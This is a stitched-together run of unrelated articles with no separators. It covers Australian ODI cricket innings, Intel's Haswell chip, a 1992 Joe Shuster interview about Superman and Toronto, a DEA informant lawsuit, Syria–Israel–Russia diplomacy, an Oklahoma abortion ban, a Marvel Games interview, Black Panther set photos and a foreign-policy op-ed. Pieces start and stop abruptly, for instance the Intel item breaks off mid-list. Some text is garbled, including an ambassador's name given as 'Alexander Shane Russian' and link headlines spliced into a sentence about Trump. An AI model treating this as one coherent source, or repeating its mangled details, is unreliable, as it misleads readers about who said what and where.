The scenario: Chasing an improbable 383, Faulkner entered the fray at 5-132 in the 22nd over, with Australia needing 252 runs from 238 balls.
The knock: After feeling the wrath of Rohit Sharma's extraordinary 209 - conceding 383 in total - and with half the side back in the pavilion, James Faulkner had a lot going against him. The Tasmanian had two lives before he reached 30 and promptly made India pay. In one Ravindra Jadeja over he clobbered 15 runs and brought up his half-century from 35 balls. It was from there that Faulkner exploded, taking three more boundaries from Jadeja's next over before punishing paceman Vinay Kumar for three fours and a six to motor from 78 to 99 in one brutal over. A single to cover was all he needed to reach his maiden ODI hundred, arriving at the milestone in 57 balls, which was then the fastest ever by an Australian. However, at that point the tourists needed 90 from 71 balls with only two wickets in hand. Faulkner and Clint McKay put on an Australian record 115 for the ninth wicket, but the challenge was too great, with the allrounder the last man out still 57 runs short. At the time, Faulkner's knock was the third-highest score by a No.7 batsman in ODI cricket and the highest by an Australian, but that record now belongs to someone else (see below).
Memorable Moment - Faulkner's Gabba miracle
3. Marcus Stoinis
Stoinis celebrates a stunning century // Getty
The numbers: 146no from 117 balls, 9x4, 11x6 against New Zealand in Auckland, 2017
The scenario: Australia were on track for a heavy defeat when Stoinis walked to the centre with the score on 5-54 after 13 overs, chasing New Zealand's 9-286.
The knock: After entering at 5-54, matters got worse for Stoinis and Australia when debutant Sam Heazlett departed for four to leave the visitors on the doorstep of defeat at 6-67 in the 19th over. That's when Melbourne Stars teammates Stoinis and Faulkner came together, devised a plan and set about a salvage job. Stoinis contributed 50 of the 81-run partnership with Faulkner before the latter was dismissed in the 35th over at 7-148. Pat Cummins played a cameo of 36 from 28 balls to take the pressure off Stoinis, but once the paceman went it was time for the Victorian to explode. His first 73 runs came from 84 balls, his next 73 from just 33. The last two wickets put on 76, with Stoinis contributing all but three of them. Sixty-six of those runs came in boundaries as he hogged the strike, choosing to blast sixes and take a single from the final ball to shield No.11 Josh Hazlewood, with the plan working to the point that the last pair put on 54 without Hazlewood facing a single delivery. The allrounder hit 11 sixes in total – the second most by an Australian in ODI cricket – with one of those maximums bringing up his maiden ODI century from 96 balls. But just as Stoinis was set to pull off one of the greatest comebacks ever seen, Hazlewood was run out backing up too far to end Australia's innings seven runs short of victory. While he didn't get the result, Stoinis' knock will not be forgotten for a long, long time.
2. Michael Bevan
Another Bevan masterclass // Getty
The numbers: 102no from 95 balls, 7x4 against New Zealand in Melbourne, 2002
The scenario: Chasing 246 to win, Australia's powerful batting line-up was reduced to 4-53 in the 14th over by Shane Bond and co. Enter Michael Bevan.
The knock: By 2002, if there was one thing Australian fans, players and their opponents knew for certain it was that no run chase was impossible with Michael Bevan at the crease. At the MCG one January evening, Australia were in trouble after restricting the in-form Black Caps to a respectable 8-245. At their lowest point, Australia slumped to 6-82 when Ian Harvey was caught behind off the bowling of Bond, leaving only Bevan and the tail in pursuit of the distant target. Bevan – a human run-chase calculator – didn't panic in the face of such adversity. Instead, he set about building partnerships; firstly one worth 61 runs with Shane Warne, then a further 81 with the underrated lower-order batsman Brett Lee, which brought Australia within 22 runs of victory. Andy Bichel would be Bevan's last partner and he was made to run, with the senior batsman peeling off five consecutive twos in the penultimate over, with the fourth double bring the left-hander his century. Bichel, like Lee, was more than handy with the bat, and iced the game in the final over by hitting two boundaries to win by two wickets with three balls to spare. Once again, Bevan proved why he was the master of the one-day run chase.
1. Andrew Symonds
Symonds was none to pleased with Waqar // Getty
The numbers: 143no from 125 balls, 18x4, 2x6 against Pakistan in Johannesburg, 2003
The scenario: Sent in to bat by Pakistan, Australia's top order was destroyed by a rampant Wasim Akram to be 4-86 at the 16th over.
The knock: Australia had been rocked in the lead-up to their opening match of the 2003 World Cup by the suspensions of Shane Warne and Darren Lehmann and injury to Michael Bevan. Symonds, who was the last player chosen in the 15-man squad at the request of captain Ricky Ponting, found himself in the deep end immediately facing the star-studded attack of Wasim, Waqar Younis and Shoaib Akhtar. But this was a different Symonds from the man who had averaged just 23 with the bat to that point in his stop-start career. Gone was the bashing and thrashing from ball one, instead patience and control took over and he slowly edged Australia out of trouble. He found allies in Ponting, Brad Hogg and Ian Harvey as he then went berserk as the overs dwindled down. His maiden century came in 98 minutes at the crease from 92 balls and included 15 boundaries. Amidst the carnage – Australia plundered 87 from the final 10 overs – Waqar Younis was taken out of the attack for bowling two dangerous waist-high full-tosses, the second whizzing past Symonds' head much to the displeasure of the batsman, who made his feelings well known to both bowler and umpire. From 4-86, Australia finished their 50 overs on 8-310. Symonds was duly awarded man-of-the-match honours for his incredible innings, which kick-started a brilliant run in all forms of the game for his country.
Intel
How serious is Intel about battery life on its next processor? Very.
On Thursday, the world's largest chipmaker hauled out two chip experts to brief journalists on the ways Intel's fourth-generation core processor, aka Haswell, reduces power consumption and boosts battery life.
Intel is claiming a 50 percent improvement in battery life for devices using Haswell compared to the current Ivy Bridge silicon.
The chip will be officially introduced on June 3 and is expected to power future Windows, Apple, and Chrome OS computers.
The information below was provided by Rani N. Borkar, general manager, Intel Architecture Development Group, and Kaizad Mistry, Technology and Manufacturing Group director, Logic Technology Integration at Intel.
Haswell improvements:
On-chip voltage regulator: Fully Integrated Voltage Regulator. This is an industry first, Intel said. Combines multiple voltage regulators into one. This reduces the motherboard footprint, leading to smaller and sleeker devices.

Joe Shuster, the co-creator of Superman, died in Los Angeles July 30, 1992. In his last interview, Shuster tells Star reporter Henry Mietkiewicz about the Man of Steel's links to Toronto. This story ran April 26, 1992.
By Henry Mietkiewicz -The Toronto Star
BRENTWOOD, Calif. – By the time he was hawking The Daily Star in downtown Toronto in the Roaring Twenties, 9-year-old Joe Shuster had already come to believe he was selling more than mere newspapers.
To this ambitious newsboy, The Star was a passport to wonder.
Within its pages, Joe had discovered the fantasy world of the color comics and, along with it, the inspiration that would make him the co-creator of one of the most illustrious fictional characters of the 20th century: Superman.
Even working as a Star newsboy had long-range effects. By peddling papers amid such imposing office towers as the old Star building on King St. W., Joe was exposed to sights and sounds that would later be incorporated into Superman's home town of Metropolis.
When Superman debuted as the comics sensation of 1938, the Toronto-born cartoonist (who moved to Cleveland at the age of 10) wanted to express his appreciation for those formative, first impressions.
So, Shuster gave the name “The Daily Star” to the Metropolis newspaper that employed Superman's alter-ego, mild-mannered reporter Clark Kent.
Not until 1940, on orders from a New York editor, did Shuster and his partner, writer Jerry Siegel rename the paper the Daily Planet.
Today Shuster smiles as he recalls the excitement of those early days, when Superman's exploits set the standard for a whole new generation of gaudily costumed crime-fighters.
Memories are all that remain for the frail, 77-year-old artist, who neatly tucks his most cherished moments into the dozens of scrapbooks and photo albums that line his simple, one-bedroom apartment in suburban West Los Angeles.
Reminiscing in public, though, is something Shuster has long avoided.
A bitter, mid-'70s struggle against the DC Comics company and its parent, Warner Communications finally resulted in a pension for the impoverished creators of the Man of Steel.
Fearful of doing anything to jeopardize their hard-won gains with DC Comics, they now shun publicity, having given their last interview to a comics industry journal in the early '80s.
Still in his eagerness to help mark The Star's 100th birthday, Shuster recently broke his 10-year silence by granting an exclusive interview that sheds new light on the early ties between Superman, The Star and Toronto.
“Unfortunately, I was never able to visit Toronto after 1941,” said the frail, soft-spoken cartoonist during a wide-ranging, three-hour conversation earlier this month.
“That's why I'm so eager to talk with The Star now. I feel so deeply about this particular interview, because I've never had the chance to properly express my gratitude.
“Now that the paper's anniversary has arrived, I can tell you I have very fond memories of the Toronto Star. It was a very important part of my life.”
Mention of The Star sends Shuster scurrying to the cardboard boxes that hold mementoes and treasures from every era sheet music from the Superman Broadway play of 1966, enlarged photocopies of the first Superman sketches from the '30s, a mid-'40s photograph of Siegel, and issues of Reader's Digest, Newsweek and Us that cover-featured the Man of Steel when the Superman movie was released in 1978.
Finally, Shuster locates a hardcover book of reprinted Superman stories that were first published in the late '30s. Settling gently on to the sofa, he lowers his head to the glossy pages and squints while looking for a particular comic panel.
The search goes slowly. Blindness and other ailments are slowly overtaking Shuster, who has lost most of the vision in his right eye and uses oversized magnifying glasses to read the mail and make sense of the fleeting images on his television screen.
Even signing his name is a chore. His left hand the one that once drew colorful figures soaring over futuristic cities can no longer hold a pencil firmly, while his right hand trembles as he labors to shape the letters.
Siegel, too, is feeling the weight of years and cannot participate in the interview, because he's recovering from heart-bypass surgery.
“There it is,” Shuster says, pointing to a picture of Superman descending toward a Metropolis skyline. The caption on the comic panel says the Man of Steel has landed near the Daily Star building.
“Sure! The Star!” Shuster exclaims, wheezing slightly. “Not the Planet. That came later.
“I still remember drawing one of the earliest panels that showed the newspaper building. We needed a name, and I spontaneously remembered the Toronto Star. So that's the way I lettered it. I decided to do it that way on the spur of the moment, because The Star was such a great influence on my life.”
That influence was acquired, quite literally, on his father's knee. Shuster remembers his father, Julius, returning home every evening from his tailor shop in Toronto's garment district, and hoisting his son on to his knee to read him the comics.
Young Joe was enchanted. And on weekends, when the comics were printed in glorious color, they were the ultimate entertainment.
“In those days, color comics were published on a large scale. They would devote an entire page to one comic, usually with vivid colors very bright, vivid colors.
“Of course, I was only 3 or 4 and I couldn't read. So we had a ritual. We would both open up the color comics and my father would read all the dialogue and balloons. I remember the Katzenjammer Kids, Boob McNutt, Happy Hooligan and Barney Google.
“But my sharpest memory is of little Nemo. It was a very imaginative strip and it even had a touch of science fiction in it. It had marvellous scenes Winsor McCay's depiction of the city of the future, the planets all the things I loved. That was among the things that turned me on to fantasy and science fiction.
“Later on, I began to read the comics myself and I had hopes of someday drawing a comic strip of my own.”
It wasn't long before Joe's talent for drawing became apparent. His younger sister, Jean Peavy of Albuquerque, New Mexico, even remembers her 4-year-old brother drawing elaborate scenes on the walls of their Toronto home.
The problem, Peavy says, was that paper was a luxury in a household where money was always tight. Julius, an immigrant from Rotterdam, and Ida, who had come from Kiev, were barely able to make ends meet.
“There were times,” Peavy says, “when my mother was able to get Joe some pieces of white paper from the butcher. But that didn't happen often.”
Instead, Joe became a scrounger, honing his artistic skill on whatever scraps of discarded paper and bits of cardboard he could find.
“I would go from store to store in Toronto and pick up whatever they threw out,” Shuster recalls. “One day, I was lucky enough to find a bunch of wallpaper rolls that were unused and left over from some job.
“The backs were blank, naturally. So it was a goldmine for me, and I went home with every roll I could carry. I kept using that wallpaper for a long time.
“Years later (in the mid-'30s), Jerry and I sold our first two stories to DC Comics one was about (swashbuckler) Henry Duval and the other was (magician) Dr. Occult. One was drawn on brown wrapping paper and the other was drawn on the back of wallpaper from Toronto.
“And DC approved them, just like that! It's incredible! But DC did say, `We like your ideas, we like your scripts and we like your drawings. But please, copy over the stories in pen and ink on good paper.'
“So I got my mother and father to lend me the money to go out and buy some decent paper the first drawing paper I ever had in order to submit these stories properly to DC Comics.”
Shuster's recollections of Toronto are happy ones, although he does remember his family having to move regularly, most likely when rent became a problem. Details are hazy now, but he recalls living on Bathurst, Oxford and Borden Sts. and attending Ryerson and Lansdowne Public Schools.
Joe was also greatly impressed by Toronto's vitality and size, especially when he became a newsboy and began to get a clearer sense of his surroundings.
When, in the '30s, it came time for him to draw the skyline and landmarks of Metropolis, Shuster dismissed Cleveland from his mind and turned instead to memories of Toronto.
“Cleveland was not nearly as metropolitan as Toronto was, and it was not as big or as beautiful. Whatever buildings I saw in Toronto remained in my mind and came out in the form of Metropolis.
“As I realized later on, Toronto is a much more beautiful city than Cleveland ever was.” Pausing for a moment, Shuster chuckles and adds, “I guess I don't have to worry about saying that now.”
Even after Julius moved the family to Cleveland in 1924 for business reasons, Joe maintained his Canadian link through a close friendship with his cousin, Frank the same Frank Shuster of the Wayne and Shuster comedy team.
Interestingly, Joe and Frank were double first-cousins: Their fathers (Julius and Jack) were brothers and their mothers (Ida and Bessie) were sisters.
Jean Peavy even recalls that at one point, her family and Frank's family cut expenses by sharing a house Frank Shuster downstairs and Joe Shuster upstairs.
Joe and Frank became ardent movie-goers, often spending entire days together watching the silent pictures in the downtown theatre where Frank's father (Joe's uncle Jack) worked as a projectionist.
In later years, when Shuster tried to imagine what Superman and his friends would look like, he drew upon actors in the movies he'd seen in Toronto with Frank.
Superman, with his heroic physique and glowing optimism, was patterned largely after Douglas Fairbanks Sr. And Clark Kent his name derived from movie stars Clark Gable and Kent Taylor was a combination of timorous, bespectacled Harold Lloyd and pale, mild-mannered Joe Shuster himself.
(Lois Lane, by the way, came not from the movies, but was modelled on Joanne Carter, who later became Jerry Siegel's wife.)
But could that be right Joe Shuster as Clark Kent? “No question about it,” says Frank Shuster, who spent summer vacations with his cousin in Cleveland and watched Joe's talent develop.
“I'd try to get him to come out and play ball,” Frank says, “because I was a much more active and physical kind of guy. I'll admit that Joe believed in lifting weights and making himself strong, but he was never one for actual activity.
“He looked like the stereotypical, 90-pound weakling getting sand kicked in his face. And it later occurred to me that he was Clark Kent the sort of nebbish in glasses that everyone wanted to kick around but underneath he was the Man of Steel.
“It came from him being the quiet, pensive kid who sat there drawing, and underneath it all, really just wanting to have that strength and that power.”
Power and fame were showered on Shuster and Siegel within months of Superman's first appearance in June, 1938, in Action Comics no. 1. Among the first publications to acknowledge the character's impact was Time magazine, followed closely by The Toronto Star.
“I do remember that when Superman was sold, The Star was one of the first to send a reporter,” Joe Shuster says with a smile. “That's another reason I'm grateful. They called long-distance to set up an interview. And then, I remember being interviewed by The Star in New York, soon after Superman became a success.”
Before long, Shuster and Siegel had time for little else but scripting and drawing Superman one story a month in Action Comics, three or four stories in the quarterly (and later bi-monthly) Superman Comics, a daily and week-end newspaper strip, and a host of merchandising spinoffs.
The workload kept Shuster tied to his easel, but he did manage one, final visit to Toronto in December, 1941, to be the best man at his cousin Frank's wedding.
While in town, he also attended a benefit at the Eaton Auditorium hosted by the Toronto Star Santa Claus Fund. The highlight of the show was an auction of an original painting of Superman by Shuster, with proceeds going to needy children.
Today, despite his illness and the professional setbacks of the '50s and '60s, Shuster still thinks of those less fortunate than himself.
One corner of his apartment is jammed with stereo components three turntables, several tapedecks and amplifiers, a number of CD players and a dozen high-power speakers that will be donated to the visually impaired.
Classical music, especially his rare collection of opera overtures, is among his greatest pleasures and he never misses the chance to get the most out of his recordings by acquiring the latest in audio technology even if it means giving away equipment that's less than a year old.
Relations with DC and Warner have improved greatly “We're happy with the way we've been treated; they've been really good to us” and, health permitting, the old partners still get together for dinner several times a month.
But, Shuster says, the biggest thrill knows that new generations of comics fans are growing up with Superman, even if the Man of Steel is drawn by other hands.
“There aren't many people who can honestly say they'll be leaving behind something as important as Superman. But Jerry and I can, and that's a good feeling. We're very, very proud and happy and pleased.”

A new lawsuit say a man charged with killing another man in Albuquerque was an active U.S. Drug Enforcement Administration informer who was improperly supervised.
The Albuquerque Journal reports the family of a Jason Estrada who was gunned down in 2013 near his South Valley home recently filed a $50 million lawsuit against the agency.
Thirty-one-year-old Edward Quintana has been charged with killing Estrada. He also is charged with criminal sexual penetration of a child under 13.
Albuquerque police say Estrada was killed when he confronted Quintana over the sexual assaults of a child.
The lawsuit claims Quintana previously was debriefed by agents and became a "confidential source" despite his criminal background.
A spokeswoman for U.S. Attorney's Office in Albuquerque said the office had no comment on the lawsuit.

Even before Israeli Prime Minister Benjamin Netanyahu arrived at the Black Sea resort of Sochi last Wednesday for his sixth consultation in two years with Russian President Vladimir Putin, Moscow's representative in Tel Aviv laid out a soothing if improbable vision of a Syria free of Iranian troops and Shiite militias.
“We agree that there should be no foreign forces in Syria, including the Iranian army,” Russian ambassador Alexander Shane Russian told Israel's Channel One News. “But at this stage we must support the peace process, the current [Assad] government, and the struggle against terror.”
If the Russians and the Israelis agreed that ISIS and al-Qaeda are the only “terror” groups operating in Syria, Tel Aviv might be placated with the ambassador's assertion that Moscow “always takes into account Israel's security interests when it is conducting its counter-terrorism operation in Syria and trying to bring peace to the region.”
After all, the regime's army has been depleted by battlefield casualties and dwindling recruitment, the territory of the Syrian state is on course to be diminished in the northeast by some form of Kurdish autonomy, and the nationwide destruction of basic infrastructure should leave Assad with very little to challenge Israel.
So far Putin and Netanyahu have avoided a direct clash as their air forces hit different targets—the Israelis bombing Hezbollah and Shiite militias, and the Russians targeting ISIS and rebel-friendly population centers. Still Netanyahu and the Israeli security establishment are clearly ill at ease.
The Russian control tower in Latakia maintains a hotline with the Israeli defense ministry, and it is acknowledged that the Israeli air force has conducted over 100 raids on Iranian and Shiite militia targets, but there are scores of these assets too close to Russian installations for Tel Aviv to hit without triggering a crisis with Moscow.
Meanwhile, Iran is building missile factories adjacent to regime bases in Tartus, and intensifying coordination with Lebanon's Hezbollah. The Israeli leadership is concerned that Tehran's support for the “axis of resistance” is as robust as ever. Assad's government underscored its commitment to the alliance with Tehran and the struggle against Israel even as its state-run media largely ignored the Putin-Netanyahu summit.
“Syria and its allies, Russia and Iran, remain firm in their support of Arab and Palestinian rights despite all plots woven by the Americans, the Israelis, and the Arab Gulf regimes,” declared Assad advisor Bouthaina Shaaban in June. “What is happening in Syria, Iraq, and across the Arab nation is linked to the Arab-Israeli conflict as it seeks to divide Arabs and distance them from their allies in Iran and Russia,” she added.
Curtailing Iranian power in Syria would demonstrate Russia's commitment to its espoused goal of advancing regional security and quell increasing domestic dissent over support for Assad—especially among its own large Sunni Muslim minority. But Damascus was already deeply intertwined with the Iranians prior to the Syrian uprising. The Syrians were reluctant to downgrade its relationship with Iran in exchange for peace with Israel, and it's unlikely that Assad would be willing, or even able, to show them the door now.
Former U.S. ambassador to Israel Daniel Shapiro recalls an early effort by former President Barack Obama to engage the Assad regime on curtailing Iran's presence in Syria. “I drew the conclusion that the odds of an agreement between Israel and Syria were exceedingly low, and it's not because Israel wasn't ready to consider the price,” Shapiro told me.
“There were serious discussions with a land for peace formula that's familiar from earlier negotiations. But there was never an indication that I saw, and it also affected our own engagement strategy with Syria, that Assad was prepared to significantly reduce his ties to Iran and Hezbollah,” said Shapiro, now a visiting fellow at the Tel Aviv University's Institute for National Security Studies. “That reliance was such a central pillar of his own regime's ability to maintain control in Syria and maintain influence in Lebanon. As late as 2011, there were people in the U.S. and in Israel who thought such a deal would be possible, but I was not one of them.”
Assad's commitment to the alliance with Iran has swelled as the current American administration has functionally abandoned the moderate Sunni rebels and partnered with the Russians on de-escalation arrangements in southern Syria—an effort that has also brought the Jordanians closer to Moscow.
With the Trump administration moving quickly toward Putin's managed stability stance on issues including constitutional and security arrangements, disappointed Sunni opposition figures are criticizing the Israelis for not embracing the anti-Assad cause.
“There are influential entities in Israel that want to protect Assad,” said Fahad al-Masri, a former Free Syrian Army spokesman who now leads an opposition group based in Paris called the National Salvation Front.
In an attempt to shape the Syria policy of the incoming administration, the Masri's group issued a detailed “road map” for Syrian-Israeli peace just five days before Trump's inauguration declaring friendship with Israel, a call to expel all Iranian military advisers and Hezbollah troops from Syria, and a “fair settlement on the Golan issue that satisfies both the Syrian and Israeli peoples.”
Israel's ambivalence to advance the cause of the F.S.A., and Netanyahu's “realism” on Assad dashed Masri's hopes. “Our initiative was aborted by some parties inside Israel still interested in a no peace, no war status,” said Masri.
Pro-Assad Syrians are gloating at Tel Aviv's diminished room to maneuver with the Russians now in place. “It's not the same Syria as two or three years ago,” Wael al-Hussaini, a Syrian-Lebanese blogger and a contributor to Russia Insider , told me . “Damascus can increasingly defend itself against Israeli airstrikes and I think both Putin and Assad could agree to remove the Iranians and Hezbollah, if the Israelis leave the Golan.”
No matter how frequently Netanyahu visits Russia, Israel is facing a grim outlook along its northern border. Iran and Hezbollah are expanding their influence in Syria, increasing Assad's dependence on them for survival. Netanyahu's tough talk can't diminish the reality that Israel stands, for the moment, in a weakened position as a postwar Syria begins to emerge.
(Reuters) - The Oklahoma Senate on Wednesday passed a ban on the main procedure used for second trimester abortions, a day after neighboring Kansas became the first state to ban the practice that its critics call “dismemberment abortions.”
The “Dismemberment Abortion Act” passed easily in both houses of the Republican-dominated Oklahoma legislature and should soon head to Governor Mary Fallin, a Republican, who has been a staunch supporter of abortion restrictions.
The procedure is set to be the newest political flashpoint in the U.S. debate over reproductive rights with groups opposed to abortions looking to introduce similar bans in other states.
“This law has the power to transform the landscape of abortion policy in the United States,” Carol Tobias, president of National Right to Life, a prominent group opposed to abortions, said in a statement on Tuesday in regard to the Kansas ban.
The process often referred to as dilation and evacuation is regarded by healthcare experts as the safest way to conduct a second trimester abortion. The fetus is typically removed with forceps, sometimes in pieces.
Imposing bans will interfere with physicians as they try to give the best care to women by reducing access in second trimester abortions, said Elizabeth Nash, with the Guttmacher Institute, a research group that supports the right to abortion but whose research is cited by both sides in the debate.
“This is a huge overstep by politicians into the medical practice,” said Nash, a specialist in state legislation with the institute.
Nearly 90 percent of U.S. abortions take place in the first trimester. The procedure banned in Kansas was used in about 8 to 9 percent of abortions there.
Some women are forced to delay the procedure to raise funds for medical care or arrange a trip to a facility that provides abortions, which have become fewer in states where Republican-controlled governments have imposed restrictions that women's rights groups said are aimed at eliminating clinics.
Kansas has been at the forefront in applying restrictions. Missouri and South Carolina are also looking to impose a similar ban on the second trimester procedure.
2017 is already a big year for Marvel. This weekend, Guardians of the Galaxy Vol. 2 opened in theaters. On the TV side, teasers for the Inhumans show started to come out. And of course, on games, we have had Telltale's Guardians of the Galaxy, Marvel Heroes Omega's beta, and a full slate of mobile titles.
With so much happening in the wide-reaching world of Marvel, we sat down with Jay Ong, the senior vice president of games and innovation at Marvel, to discuss the studio's role in game creation, the future of VR, and the secretive world of game codenames.
GameSpot: From your position at Marvel Games, how much insight do you have into the broader Marvel world? Like, how closely do the different teams work together? Marvel creates these expansive story universes, and you don't want to spoil anything by letting details leak too early, but you also have to share content across different groups.
Jay Ong: We have great relationships with all the different business units that create that new IP. On the film side, TV, animation, comics--there's quite a bit of coordination and communication. We don't want to spoil things for the other businesses--that's off limits--but in terms of drawing inspiration from and helping contribute to one another, it's actually designed to feed both ways. So, some of what we're creating feeds into the other parts of the business, including on the comic side and things like that.
We have to be careful in terms of avoiding spoilers, like you said, but there's still a lot of coordination.
Jay Ong
Do you see Marvel Games as more of a support unit, or does it also stand alone in the creation of the Marvel canon?
We're absolutely stand alone. When I started at Marvel, there was this chance to reboot the business; to start from scratch. One of the key pillars we strived for was to use our games as a driver of the brand, certainly, and as a creator of original IP. So we strive very hard to make sure our games have really cool storylines that are wholly original.
Our executive creative director, he's from the comic book side of the business, and he's an incredible storyteller. He understands how the sauce is made, so to speak, and he collaborates with our partners to make sure that the stories are interesting, original, authentically Marvel, and unique to our games. That's on the story side.
You know, Spider-man's costume in the [2017 Spider-Man] game, for instance, is original, right? It's neither the theatrical costume nor is it from the comic books. The white spider design is totally original. We've come a long way. I think we used to be a support unit; now we're big, not as big as theatrical or TV, but we're growing.
Of course, not announcing anything, but with TV as an example: They're able to take a lot of liberties and create their own characters, create their own stories. Do you think games can get to the point where you get to tell your own wholly original stories?
Yes. And really, we're already doing that to some degree. For brand-new characters, we've worked with some of our partners, and we've already done that, and you can see that in our work with Kabam. And all of our games have original stories. Now if we're talking about brand-new universe and something that's never been seen before from the ground up, that day'll come...possibly. It's hard to say [laughs].
Marvel works with a wide variety of developers like Kabam, Square Enix. How do you decide who those partners are going to be? Do they come to you or do you reach out to studios you love?
It works both ways. We're not fixated on any particular methodology, but as far as picking who to work with, it's actually pretty straightforward. We look for a few things; first and foremost we look for talent. We have incredible ambition about what kind of games we want to do, and the equation's very simple. You need a super-talented team to create these unforgettable games.
Spider-man's new video game costume.
The second thing we look for is: "Do they have passion for our IP?" Talent without passion is just going to go through the motions. So they need passion for our IP. Then after that we look for an investment, in terms of how much time, talent, and assets they're going to devote to creating this thing. Do they share our ambition for doing something truly grand? Lastly is the timing; does the timing work? Sometimes the teams are busy on something else. The stars, to some extent, have to align properly.
As far as how the process works, we do reach out to certain teams that we want to work with, because we think that the talent level would be an incredibe fit for some of the things we want do. And we also get developers asking us. Sometimes it's as simple as meeting each other at DICE or GDC and just saying, "Hi. How're you doing?" And then it goes from there.
Thinking about Marvel games historically, for a long time we've gotten a lot of very action-focused titles. It's kind of like early comic books. The medium has matured, and now we see stuff like Guardians of the Galaxy going into the adventure game realm. But do you think there's a place for all the different kinds of Marvel comics to live in a video game? Or are there some that might only really work for theatrical or for TV, or some that can only be comics?
There are so many different types of games, right? We're looking at not just console and mobile, but VR, as well. The possibilities are practically without limits, so I don't see any limitations. I would say, in some ways, games are more flexible than film or TV in terms of being able to tell amazingly different stories. Some games might be more story driven, such as Telltale, others more action driven like you mentioned earlier. There's an opportunity there to do some pretty crazy things.
I would say, in some ways, games are more flexible than film or TV in terms of being able to tell amazingly different stories.
Of course, none of your titles are announced as specifically for virtual reality, but thinking about that tech from a Marvel Games perspectives, do you think VR has potential?
Absolutely. In fact, we did a deep dive in looking at the space towards the end of last year, and it offers some pretty incredible opportunities, in terms of delivering really cool experiences. We can't say anything yet, but believe me, we're not shying away from it.
When do you think we're going to hear more about these things? Will it be around E3, or later?
[Long pause]. Soon. [laughs] There are absolutely things in the works, but we're just not quite ready to announce them yet.
What is the Marvel Games ethos? It's an interesting system that you guys have, and it's similar to Disney itself. They used to create games through in-house studios, and they've also shifted toward a partner-focused structure.
The way we've constructed our business is around partnerships and licensing, to use the technical terms, but we see ourselves as creative collaborators. With each of our partners we work in creative collaboration, on one side, in terms of helping them maximize use of our IP. On the other side, on a macro level, we're curators of a portfolio. It's our job to think about what our fans want. What would delight them? What would make them think about and be able to experience this the way we talked about it? And how can we deliver this portfolio of games to them, making sure each game is different enough from the others, and that they all provide very satisfying experiences without too much overlap?
Those are the main two chunks of our job. One is curation of this portfolio and assembling this package together over time. And these things take a long time; we announced some of our current projects two years ago, and there are many announcements to come. But that's part of our job: putting the portfolio together. And obviously all the deals and all the partnerships.
Once the deals are done, then the creative process begins, and it's very collaborative. [Insomniac Games CEO] Ted Price is amazing. His team's amazing. They happen to be 10 minutes away from us, believe it or not, just by pure happenstance. So we're over in their offices all the time. They ask us to come because we collaborate on things like storylines, and character selection, and art style, and all sorts of things that it takes to put together amazing games.
And the definition of what defines a game continues to change and grow. Mobile gamers don't always consider themselves gamers, even if they spend hours everyday playing. And a lot of Disney theme park attractions are games. go to like Disneyland, and those are games. But that's a completely different team, right? The Imagineers that create those attractions and rides at Disney, even though they're not necessarily "game designers" in the exact same way, do you work with them to craft those Marvel-themed experiences?
There's actually a separate team at Marvel whose job it is to do exactly that. They're the rides and attractions team, and they're right down the hallway from me. They work with an Imagineering team on things like the new Guardians of the Galaxy ride that opened up at Disneyland. The teams worked very closely together on it in terms of, "Here's our IP and here's how to maximize it."
I could give you a hint. All of our games' code names are named after food items.
It's somewhat similar to what we do, but on the theme park and rides side. Once in a while they'll ask us for assistance, if it's something that's very gaming-focused, and we're happy to help, but it's something that that other team drives.
Are you ever afraid of accidentally slipping something out that you're not supposed to, like when talking with friends or maybe after having too too many drinks?
It's always a danger, right, and that's why I have PR sitting around for interviews. She'll probably throw her phone at me if I start to say something I shouldn't. [laughs]
But a lot of times, internally, we use code names. So if something accidentally does slip out, it wouldn't make sense to anyone anyway. And for all the TV shows, all the movies, we use code names. Even our games, within our team, we use code names.
Can you tell us any of the code names for stuff that's already come out?
No.
Aww.
I could give you a hint. All of our games' code names are named after food items. Different snack food items. It's just funny that they're this common theme. I used to work at Blizzard and the code names there were named after mythological creatures, but we were like, "You know, we don't want something too grandiose. We want to keep it simple." We all like to eat, and so literally every single game I saw on the screen has a code name that's related to food in some way.
We know a lot about the movie plans for the next few years, but what else can we look forward to on the games side?
It's going to be exciting here. Absolutely expect some announcements in VR, that's something we're really excited about. I think our fans are going to go crazy. The things we're doing there are absolutely amazing.
We see VR in the same way we see the other platforms in terms of if you want to do something, you need to do something truly amazing. One of the things about our team, and we talked about our team ethos earlier, is that we have almost irrational ambition. It's true. When I first started at Marvel, going back to 2014, the things we were dreaming about back then were almost crazy. We wanted to do these amazing console games, we wanted to do these amazing chart topping mobile games; it was irrational and crazy, but we dreamed and it actually worked because the IP is really strong. And we got lucky with a few things happening the right way at the right time.
In VR, we have that same ambition. We think if we do something there, it shouldn't be just for the novelty of it. It should be something that defines the platform, that defines the experience. Certainly we're looking to build when Spider-man comes out, it'll be one of the best games on the platform, and when Avengers come out, it'll be one of the best games on those platforms. We think our efforts in VR will be the same thing.
After months of principal photography in Atlanta, Georgia, today'sfilming in Berlin, Germany, has finally provided our first look at Chadwick Boseman's Black Panther and Sebastian Stan's Winter Soldier. Though it does not appear to be the actors in costume, but rather their respective stunt doubles, they and Chris Evans' double were spotted filming an action scene together on the rooftop of a building that is reportedly doubling for the United Nations headquarters in Vienna, Austria. Check out the photos below, and be on the lookout for more!UPDATE: More photos have now arrived thanks to both the Daily Mail and ComingSoon.net . And they offer a much better look at the Black Panther donned by Chadwick Boseman's stunt double as he scales a building along with Sebastian Stan's Winter Soldier double. What do you think?
Yesterday's 2017 review and forecast for 2018 focused on the most urgent challenges the Trump administration faces: the volatile Middle East, international terrorism and the proliferation of nuclear, chemical and biological weapons. Today, we examine the strategic threats posed by China and Russia and one of President Trump Donald John TrumpHouse committee believes it has evidence Trump requested putting ally in charge of Cohen probe: report Vietnamese airline takes steps to open flights to US on sidelines of Trump-Kim summit Manafort's attorneys say he should get less than 10 years in prison MORE's continuing priorities: preserving and enhancing American sovereignty.
China has likely been Trump's biggest personal disappointment in 2017, one where he thought that major improvements might be possible, especially in international trade. Despite significant investments of time and attention to President Xi Jinping, now empowered in ways unprecedented since Mao Tse Tung, very little has changed in Beijing's foreign policy, bilaterally or globally. There is no evidence of improved trade relations, or any effort by China to curb its abuses, such as pirating intellectual property, government discrimination against foreign traders and investors, or biased judicial fora.

Even worse, Beijing's belligerent steps to annex the South China Sea and threaten Japan and Taiwan in the East China Sea continued unabated, or even accelerated in 2017. In all probability, therefore, 2018 will see tensions ratchet up in these critical regions, as America (and hopefully others) defend against thinly veiled Chinese military aggression. Japan in particular has reached its limits as China has increased its capabilities across the full military spectrum, including at sea, in space and cyberwarfare.
